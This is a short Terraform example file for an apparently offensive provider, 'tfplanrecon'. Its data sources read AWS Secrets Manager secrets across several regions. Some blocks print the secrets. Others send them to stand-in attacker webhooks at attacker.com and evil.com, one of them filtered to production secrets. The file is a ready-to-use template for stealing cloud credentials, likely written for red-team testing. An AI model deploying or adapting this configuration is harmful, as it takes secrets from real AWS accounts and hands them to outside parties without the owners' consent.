# AWS Secrets Manager Exfiltration Example
# This data source will attempt to read secrets from AWS Secrets Manager

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Read secrets and print to console
data "tfplanrecon_aws_secrets" "console" {
  region = "us-east-1"
}

# Read secrets and send to webhook
data "tfplanrecon_aws_secrets" "exfil" {
  region      = "us-west-2"
  webhook_url = "https://attacker.com/secrets"
}

# Read secrets with filtering
data "tfplanrecon_aws_secrets" "filtered" {
  region             = "us-east-1"
  secret_name_filter = "prod-*"
  webhook_url        = "https://evil.com/secrets"
}

# Scan multiple regions (multiple instances)
data "tfplanrecon_aws_secrets" "west1" {
  region = "us-west-1"
}

data "tfplanrecon_aws_secrets" "east2" {
  region = "us-east-2"
}